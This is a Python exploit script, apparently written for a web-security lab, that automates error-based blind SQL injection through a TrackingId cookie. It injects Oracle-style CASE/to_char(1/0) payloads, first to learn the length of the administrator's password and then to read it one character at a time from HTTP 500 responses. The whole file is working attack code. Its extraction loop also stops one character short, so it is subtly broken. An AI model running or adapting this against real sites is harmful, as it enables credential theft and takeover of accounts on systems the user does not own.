#!/usr/bin/python3
from pwn import *
import requests, signal, time, sys, string
import argparse

parser = argparse.ArgumentParser(description="this script dumps a password using conditional error")
parser.add_argument("-u", "--url", help="url of the target server", dest="main_url", required=True)
parser.add_argument("-t", "--tracking-id", help="TrackingId cookie value", dest="tracking_id", required=True)
parser.add_argument("-s", "--session", help="session cookie value", dest="session", required=True)
args = parser.parse_args()

main_url = str(args.main_url)
trackingID = str(args.tracking_id)
session = str(args.session)

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

characters=string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""
    cookies = ""
    password_length = 0

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password length")

    for n in range(1,100):
        cookies = {
            'TrackingId' : "%s'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)=%d)||'" % (trackingID, n),
            'session' : "%s" % (session)
        }

        r=requests.get(main_url, cookies=cookies)
        p2.status(n)
        
        if r.status_code == 500:
            password_length = n
            break 

    p2 = log.progress("Dumping password")

    for position in range(1,password_length):
        for character in characters:

            cookies = {
                'TrackingId' : "%s'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (trackingID, position, character),
                'session' : "%s" % (session)
            }
            
            p1.status(cookies['TrackingId'])
            
            r=requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break 


if __name__ == '__main__':
    makeRequest()
